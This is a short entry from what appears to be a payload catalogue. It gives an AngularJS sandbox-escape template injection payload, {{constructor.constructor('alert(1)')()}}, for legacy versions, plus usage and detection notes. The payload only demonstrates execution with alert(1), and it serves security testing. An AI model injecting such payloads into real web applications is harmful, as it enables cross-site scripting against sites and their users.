---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - legacy-angularjs
  - payload
platforms:
  - Web
validated: true
---

# AngularJS-Legacy-Constructor-Direct-Alert

## Code

```javascript
{{constructor.constructor('alert(1)')()}}
```

## Description

Simple direct constructor invocation for legacy AngularJS 1.0.1-1.1.5 or similar frameworks like early Vue.js, executing alert(1).

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Basic legacy payload. | N/A |

## Usage

Fallback for unpatched old versions.

## Detection

- Direct constructor in templates.
- Alert in legacy app logs.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
